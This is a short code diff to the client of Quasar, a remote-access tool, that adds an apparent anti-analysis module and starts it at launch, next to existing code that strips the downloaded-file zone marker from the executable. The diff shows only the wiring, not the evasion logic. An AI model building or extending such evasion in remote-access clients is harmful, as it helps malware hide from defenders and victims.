@@ -1,4 +1,5 @@
-﻿using Quasar.Client.Config;
+﻿using Quasar.Client.Anti;
+using Quasar.Client.Config;
 using Quasar.Client.Logging;
 using Quasar.Client.Messages;
 using Quasar.Client.Networking;
@@ -93,6 +94,8 @@ namespace Quasar.Client
             // check if process with same mutex is already running on system
             if (!ApplicationMutex.CreatedNew)
                 Environment.Exit(2);
+
+            Manager.StartAnti();
 
             FileHelper.DeleteZoneIdentifier(Application.ExecutablePath);
 
